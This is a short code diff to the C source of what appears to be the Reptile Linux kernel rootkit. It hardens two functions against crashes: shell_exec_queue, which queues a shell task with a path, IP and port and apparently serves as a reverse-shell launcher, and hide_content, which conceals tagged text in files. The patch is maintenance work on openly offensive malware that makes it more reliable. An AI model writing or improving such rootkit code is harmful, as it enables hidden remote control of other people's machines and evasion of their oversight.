@@ -184,10 +184,20 @@ int shell_exec_queue(char *path, char *ip, char *port) {
 
     	REPTILE_INIT_WORK(&task->work, &shell_execer);
     	task->path = kstrdup(path, GFP_KERNEL);
-    	task->ip = kstrdup(ip, GFP_KERNEL);
-    	task->port = kstrdup(port, GFP_KERNEL);
+	if(!task->path) return -1;
 
-	if(!task->path || !task->ip || !task->port) return -1;
+	task->ip = kstrdup(ip, GFP_KERNEL);
+	if(!task->ip) {
+		kfree(task->path);
+		return -1;
+    	}
+
+	task->port = kstrdup(port, GFP_KERNEL);
+	if(!task->port) { 
+		kfree(task->path);
+		kfree(task->ip);
+		return -1;
+	}
 
     	return queue_work(work_queue, &task->work);
 }
@@ -248,7 +258,7 @@ int hide_content(void *arg, ssize_t size) {
 	p2 = strstr(buf, HIDETAGOUT);
 	p2 += strlen(HIDETAGOUT);
 
-	if(p1 >= p2) {
+	if(p1 >= p2 || !p1 || !p2) {
 		kfree(buf);
 		return size;
 	}
